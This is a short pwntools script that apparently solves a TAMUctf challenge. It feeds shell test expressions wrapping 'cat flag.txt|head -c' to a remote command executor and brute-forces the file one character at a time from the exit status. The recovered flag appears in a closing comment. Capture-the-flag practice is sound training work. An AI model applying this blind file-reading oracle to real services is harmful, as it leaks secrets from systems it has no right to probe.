import string
from pwn import *


host = "challenges.tamuctf.com" 
port = 3424
r = remote(host, port) 

def execute(command):
  r.recvuntil("Execute: ")
  log.info("sending command = {}".format(command))
  r.sendline(command)
def read_result():
  out = r.recvline().decode().strip()
  log.info(out)
  return out

if __name__=='__main__':
  flag = "gigem{"
  command = "[ \"{}\" = $(cat flag.txt|head -c {}) ]".format(flag,len(flag))
  while True:
    for c in string.digits+"_}{"+string.ascii_lowercase+string.ascii_uppercase:
      tryf = flag+c
      command = "[ \"{}\" = $(cat flag.txt|head -c {}) ]".format(tryf,len(tryf))
      execute(command)
      if read_result()=="0":
        
        break
    flag=tryf
    if flag[-1]=="}":
      break
  r.close()
  print("flag={}".format(flag))


#gigem{r3v3r53_5h3ll5}
